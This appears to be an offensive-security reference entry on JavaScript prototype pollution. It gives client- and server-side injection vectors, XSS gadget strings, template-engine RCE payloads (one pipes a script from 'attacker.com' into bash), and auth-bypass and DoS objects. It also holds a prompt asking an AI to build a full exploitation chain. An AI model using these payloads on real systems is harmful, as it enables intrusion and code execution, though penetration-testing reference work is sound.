---
id: "prototype-pollution"
title: "Prototype Pollution - Client-Side and Server-Side"
type: "technique"
category: "web-application"
subcategory: "deserialization"
tags: ["prototype-pollution", "javascript", "nodejs", "client-side", "server-side", "rce", "xss", "gadgets"]
difficulty: "advanced"
platforms: ["linux", "macos", "windows"]
related: ["xss-techniques", "xss-advanced-techniques", "javascript-analysis"]
updated: "2026-03-30"
---

## Overview

Prototype pollution is a JavaScript vulnerability where an attacker modifies `Object.prototype`, injecting properties that propagate to all objects in the application. Client-side pollution leads to XSS/DOM manipulation; server-side pollution leads to RCE, auth bypass, or DoS. Found in Node.js backends, SPAs, and any JS that deep-merges user-controlled objects.

## How It Works

```javascript
// Normal object
let obj = {};
console.log(obj.isAdmin); // undefined

// Pollute the prototype
obj.__proto__.isAdmin = true;

// Now ALL objects inherit isAdmin
let user = {};
console.log(user.isAdmin); // true  ← POLLUTED
```

## Client-Side Prototype Pollution

### Detection via URL parameters
```
# Common injection vectors
https://target.com/?__proto__[isAdmin]=true
https://target.com/?__proto__.isAdmin=true
https://target.com/?constructor[prototype][isAdmin]=true
https://target.com/#__proto__[test]=polluted

# JSON merge via query params
https://target.com/api?config={"__proto__":{"polluted":true}}
```

### Escalation to XSS (via gadgets)
```javascript
// If the app reads obj.innerHTML, obj.srcdoc, obj.src, etc.
// Pollute those properties:
?__proto__[innerHTML]=<img/src/onerror=alert(1)>
?__proto__[srcdoc]=<script>alert(1)</script>
?__proto__[src]=javascript:alert(1)

// jQuery gadget ($.fn.extend reads prototype)
?__proto__[div][0]=<img/src/onerror=alert(1)>

// Lodash _.template gadget
?__proto__[sourceURL]=x]};alert(1)//

// Handlebars gadget
?__proto__[pendingContent]=<img/src/onerror=alert(1)>
```

### Known library gadgets
```
# Lodash < 4.17.12
_.merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'))

# jQuery < 3.4.0
$.extend(true, {}, JSON.parse('{"__proto__":{"xss":"<img src=x onerror=alert(1)>"}}'))

# Pug (Jade) template engine
{"__proto__":{"block":{"type":"Text","val":"x]};process.mainModule.require('child_process').execSync('id')//"}}}

# EJS template engine
{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').execSync('id');var __tmp2"}}
```

## Server-Side Prototype Pollution

### RCE via child_process
```json
// If application spawns child processes with options from polluted prototype:
{"__proto__":{"shell":"/bin/bash","NODE_OPTIONS":"--require /proc/self/environ"}}

// Via env pollution
{"__proto__":{"env":{"NODE_OPTIONS":"--require /tmp/evil.js"}}}

// Via EJS/Pug template
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('curl attacker.com/shell|bash')//"}}
```

### Auth bypass
```json
// If code checks: if (user.role === 'admin')
// And user object inherits from polluted prototype:
{"__proto__":{"role":"admin"}}
{"__proto__":{"isAdmin":true}}
{"__proto__":{"verified":true}}
```

### DoS
```json
// Crash by polluting toString/valueOf
{"__proto__":{"toString":1}}
{"__proto__":{"valueOf":null}}
// Any code calling .toString() on any object will throw
```

## Detection Methodology

1. **Find merge/extend operations** — search JS for `merge`, `extend`, `assign`, `deepCopy`, `defaults`
2. **Test URL params** — `?__proto__[test]=polluted` then check `Object.prototype.test` in console
3. **Test JSON bodies** — send `{"__proto__":{"polluted":"yes"}}` in POST body
4. **Check for gadgets** — use browser DevTools to see if polluted properties are read

### Automated detection
```javascript
// Inject in browser console after testing
if ({}.polluted === 'yes') {
    console.log('PROTOTYPE POLLUTION CONFIRMED');
}
```

## Deep Dig Prompts

```
Given this JavaScript application [paste source or describe]:
1. Find all object merge/extend/assign operations.
2. Identify which accept user-controlled input (URL params, JSON body, headers).
3. Test __proto__ and constructor.prototype injection vectors.
4. Map the application's property lookups — which properties are read from objects that could inherit pollution?
5. Match readable properties to known gadgets (innerHTML, srcdoc, template settings, env, shell).
6. Craft a full exploitation chain from injection to XSS or RCE.
```

## Tools

- **PPScan** — Automated prototype pollution scanner
- **pp-finder** — Find prototype pollution in JavaScript
- **Burp Suite** — Manual testing with Repeater
- **Server-Side Prototype Pollution Scanner** — Burp extension by PortSwigger
- **cdnjs** — Check library versions for known vulnerable gadgets
